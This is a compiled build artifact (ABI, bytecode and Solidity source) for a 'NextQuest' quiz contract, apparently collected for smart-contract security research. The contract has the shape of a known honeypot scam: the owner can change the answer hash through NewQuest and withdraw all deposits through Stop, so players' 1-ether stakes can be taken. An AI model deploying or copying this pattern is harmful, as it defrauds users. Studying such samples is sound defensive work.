{
  "contractName": "NextQuest",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "Question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "resp",
          "type": "string"
        }
      ],
      "name": "Play",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "q",
          "type": "string"
        },
        {
          "name": "resp",
          "type": "string"
        }
      ],
      "name": "Setup",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Stop",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "q",
          "type": "string"
        },
        {
          "name": "respHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuest",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5061071e806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063117735f01461006f578063648f0bde146100d95780639668656014610135578063bedf0f4a146101d7578063c8166a8a146101e1575b005b6100d7600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192908035600019169060200190929190505050610271565b005b610133600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506102f3565b005b6101d5600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610417565b005b6101df6104f3565b005b3480156101ed57600080fd5b506101f66105af565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561023657808201518184015260208101905061021b565b50505050905090810190601f1680156102635780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102cd57600080fd5b81600090805190602001906102e392919061064d565b5080600281600019169055505050565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561032d57600080fd5b806040518082805190602001908083835b602083101515610363578051825260208201915060208101905060208303925061033e565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060001916600254600019161480156103b05750670de0b6b3a76400003410155b15610414573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610412573d6000803e3d6000fd5b505b50565b60006001026002546000191614156104ef57806040518082805190602001908083835b60208310151561045f578051825260208201915060208101905060208303925061043a565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390206002816000191690555081600090805190602001906104ac92919061064d565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561054f57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156105ac573d6000803e3d6000fd5b50565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156106455780601f1061061a57610100808354040283529160200191610645565b820191906000526020600020905b81548152906001019060200180831161062857829003601f168201915b505050505081565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061068e57805160ff19168380011785556106bc565b828001600101855582156106bc579182015b828111156106bb5782518255916020019190600101906106a0565b5b5090506106c991906106cd565b5090565b6106ef91905b808211156106eb5760008160009055506001016106d3565b5090565b905600a165627a7a72305820746d85c9026644eff208f21e646422b1e8898a722822de77a9691deeaf7fcda90029",
  "source": "contract NextQuest\n{\n    string public Question;\n    address questionSender;\n    bytes32 responseHash;\n\n    function Play(string resp) public payable {\n        require(msg.sender == tx.origin);\n        if (responseHash == keccak256(resp) && msg.value >= 1 ether) {\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n    function() public payable{}\n \n    function Setup(string q, string resp) public payable {\n        if (responseHash == 0x0) {\n            responseHash = keccak256(resp);\n            Question = q;\n            questionSender = msg.sender;\n        }\n    }\n    \n    function Stop() public payable {\n       require(msg.sender==questionSender);\n       msg.sender.transfer(address(this).balance);\n    }\n    \n    function NewQuest(string q, bytes32 respHash) public payable {\n        require(msg.sender==questionSender);\n        Question = q;\n        responseHash = respHash;\n    }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x5b0a2ade105dcea75cfb0f9785d17bf5167a7493/contracts/0x5b0a2ade105dcea75cfb0f9785d17bf5167a7493.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:54:49.721Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}